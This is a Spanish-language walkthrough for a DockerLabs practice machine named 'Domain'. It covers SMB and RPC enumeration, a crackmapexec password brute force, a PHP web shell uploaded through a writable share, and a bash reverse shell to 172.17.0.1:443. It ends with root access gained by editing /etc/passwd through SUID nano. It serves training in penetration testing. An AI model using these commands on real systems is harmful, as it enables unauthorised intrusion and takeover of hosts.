---
Nombre de la máquina: Domain
Sistema Operativo: Linux
Dificultad: Media 🟠
Skills: SMB, Crackmapexec, Brute Force, SUID
Enlace de descarga: https://mega.nz/file/4GMGGYpa#-aSLPKJxpmrvHGYi4jqLYaEVXEdGRkdJQLxPCfRI9t8
---
----

## Montando el laboratorio

Lo primero que deberemos hacer para practicar con esta máquina es, dirigirnos a la página de [dockerlabs](https://dockerlabs.es/) y descargarnos la máquina desde el [siguiente enlace](https://mega.nz/file/4GMGGYpa#-aSLPKJxpmrvHGYi4jqLYaEVXEdGRkdJQLxPCfRI9t8). Una vez descargada y descomprimida ejecutaremos el siguiente comando.

```
sudo bash auto_deploy.sh domain.tar
```

Al ejecutar el comando, tendremos que esperar hasta que nos indique que la máquina está desplegada.

![Desplegando la máquina domain](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/622d3d6d-ec1c-4e59-9aa2-e2224219edb6)

Como podemos ver en la imagen anterior, la máquina está desplegada correctamente y su dirección IP es la **172.17.0.2**. Esto nos habrá montado la máquina vulnerable *Domain* a través de *docker*. 

## Como eliminar la máquina vulnerable

En caso de querer eliminarla, simplemente presionaremos en el teclado **CTRL** + **C** y la máquina se eliminará automáticamente.

![eliminando la máquina domain](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/6f6809d9-bcf0-4bdc-ac89-279f72188328)

## Comprobando la conectividad

Una vez desplegada, deberemos cerciorarnos de que tenemos conectividad con esta. Para ello, haremos uso del comando `ping` para realizar el chequeo.

![comprobando conectividad con la máquina](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/18648b0f-8739-49dd-85e3-42f080cd2a25)

Comprobamos que tenemos conectividad y, podemos intuir mediante el **TTL**, que el sistema operativo de la máquina víctima es *Linux*.

## Enumeración

En primer lugar, empezaremos realizando un escaneo en busca de puertos abiertos haciendo uso de la herramienta `nmap`.

```
sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

Ejecutamos el comando y encontramos los siguientes puertos abiertos.

![primer escaneo máquina domain](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/a3876a34-0b3c-4313-a585-69b4e47a6280)

Sobre estos puertos abiertos, usaremos unos scripts básicos de enumeración de `nmap` y detectaremos la versión y servicios que corren bajo estos puertos.

```
sudo nmap -p80,139,445 -sCV 172.17.0.2
```

Al ejecutarlo, nos devuelve la siguiente información.

![segundo nmap máquina domain](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/0458eefa-a5ff-4e42-9a24-fb92323c8883)

Vemos que *Samba* y *Apache* están por ahí. Si echamos un vistazo a la página web, no observamos mayor información que la de a continuación.

![pagina principal puerto 80](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/25b75dc2-70be-4d8b-90d2-55a649b78233)

Probaremos a ver si encontramos mayor información, utilizando la herramienta `gobuster`, con la finalidad de encontrar alguna otra posible ruta de la página.

![enumeración de subdirectorios con gobuster](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/13651504-900d-4a96-91be-4e096b013dd6)

Sin embargo, al cabo de un rato no nos muestra nada interesante por donde ir. Como no encontramos nada por el puerto *80*, enumeraremos un poco el servicio de *SMB*. Para ello, enumeraremos los recursos compartidos a nivel de red, con la herramienta `smbmap`.

```
smbmap -H 172.17.0.2 -U ''
```

Los recursos que hay disponible por *SMB*, no parecen estar disponibles sin tener un usuario con credenciales válidas.

![smbmap null session recursos smb](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/0dd0bbc1-0e3d-4348-b108-1085f0e77e0d)

Como no tenemos ningún usuario válido de momento, intentaremos si podemos conectarnos sin credenciales, por *RPC* para enumerar un poco más.

![rpcclient connection success null session](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/ba1146af-ee08-48fc-9f34-62764460894a)

Hemos podido conectarnos por *RPC* sin credenciales, por lo que probaremos a enumerar los usuarios del sistema con `enumdomusers`.

![enumdomusers rpcclient](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/d82f6645-ac9c-466a-9ffc-1f4b67b60c7c)

Parece ser que, los usuarios *james* y *bob* son usuarios válidos del sistema. Con estos usuarios en posesión, realizaremos un ataque de fuerza bruta hacia ellos por *smb*, con la herramienta `crackmapexec`. Metiendo los usuarios *james* y *bob* en la lista `users.txt`, ejecutaremos el comando de a continuación.

```
crackmapexec smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt
```

Al cabo de un buen rato, el usuario *bob* contaba con sus credenciales en nuestro `rockyou.txt`, por lo que ahora tenemos su credencial.

![credenciales válidas de bob con crackmapexec](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/70a22804-d9c4-41dc-b731-6ff2c18bcac0)

Con estas credenciales en nuestra posesión, probaremos de nuevo a visualizar los recursos compartidos de *SMB* para ver, si con estas credenciales podemos visualizar mayor información.

![smbmap con el usuario bob](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/af7b7487-5b68-4731-876c-44b30d31258b)

Con el usuario *bob*, tenemos permisos de **lectura** y **escritura** sobre el recurso *html* y **solo lectura** en *print*. El recurso *html* puede ser interesante ver que contiene, porque si podemos subir algún fichero malicioso en este directorio, puede que desde la web podamos verlo.

Vamos a ver que contiene este directorio.

![contenido del recurso html smb](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/7e5e96e3-a151-44c3-8e57-980085fd6609)

Hay un fichero `index.html`. Después de descargar el fichero con `get index.html` y observando su contenido, nos percataremos que es el código *html* de la página principal.

![analizando index html de smb](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/1eae8d49-74de-4af0-b311-66a0a04e71b6)

## RCE

Como podemos escribir en este directorio, intentaremos subir un fichero **PHP** malicioso desde el cual, podamos ejecutar un comando en el sistema víctima, a través del parámetro *cmd* (que crearemos). El contenido del fichero es el siguiente.

![fichero php malicioso](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/8fdf3170-4f9e-4558-a697-ae77647ddd2d)

Este fichero, lo subiremos al directorio de *SMB*.

![subiendo fichero PHP malicioso](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/33d5e967-ec11-4f10-b598-bddad7474967)

Seguidamente, nos dirigiremos a la página web, y al fichero correspondiente que hemos subido. Después, ejecutaremos cualquier comando del sistema, como `whoami` y veremos su resultado.

![comando whoami ejecutado RCE](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/bd089bac-b111-4ac9-8520-7509f1587d79)

## Acceso al sistema

Como tenemos un **RCE**, nos enviaremos una *reverse shell* a través del puerto *443*. Antes, nos tenemos que poner en escucha de la siguiente manera.

![en escucha por el puerto 443 con nc](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/edff8aaa-3364-411c-9e4e-a0857351140d)

Por último, ejecutamos la siguiente *reverse shell* desde el parámetro *cmd* del fichero `pwned.php` que subimos.

```
bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

Y conseguimos acceso al sistema.

## Enumeración del sistema

Dentro del sistema, enumeraremos un poco. Empezaremos viendo los grupos a los que pertenecemos con este usuario.

![grupos del usuario www-data](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/b00a609d-babd-4af0-86c5-db5747339b2e)

No hay ningún grupo peligroso, por lo que pasaremos a ver los permisos que tenemos a nivel de *sudoers*.

![permisos sudoers](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/b06e229f-4a05-44b7-960c-ee18139a9be4)

No existe el comando `sudo`! Es un poco raro que no exista este comando, sin embargo, no nos supondrá un problema.

Continuaremos buscando por binarios *SUID*.

![binarios suid](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/09e7e6aa-8f02-4cbf-b8d9-5f47c475f66c)

El binario `/usr/bin/nano` es *SUID*. Esto, nos permitirá poder editar cualquier tipo de fichero en el sistema. 

## Escalada de privilegios (acceso como root)

Con estos privilegios en este binario, se puede *escalar privilegios* de muchas diferentes maneras. Una de ellas es, editar el fichero `/etc/passwd` y quitarle la contraseña al usuario *root*.

Al no existir el comando `sudo`, podemos editar el fichero directamente como el usuario propietario (*root*) simplemente escribiendo el comando `nano /etc/passwd`.

![fichero etc passwd editado](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/41882ba4-d5de-444d-99d8-f6144822ef98)

Con el usuario *root* sin contraseña, para poder convertirnos en él, lo haremos con el comando `su root`.

![escalada de privilegios existosa](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/94e126e2-2fc0-4982-ac21-7066a4c7a46f)
